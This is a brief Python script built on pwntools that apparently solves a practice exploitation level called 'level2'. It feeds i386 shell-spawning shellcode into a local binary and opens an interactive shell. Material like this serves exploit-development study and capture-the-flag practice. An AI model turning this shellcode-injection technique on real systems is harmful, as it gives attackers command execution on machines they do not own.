from pwn import *

payload = asm(shellcraft.i386.sh())

def main():
    binary = context.binary = ELF('./level2')
    p = binary.process()
    
    info(f'sending payload {payload}')
    p.sendline(payload)
    
    pprint(p.recv())
    
    p.interactive()
    

if __name__ == '__main__':
    main()

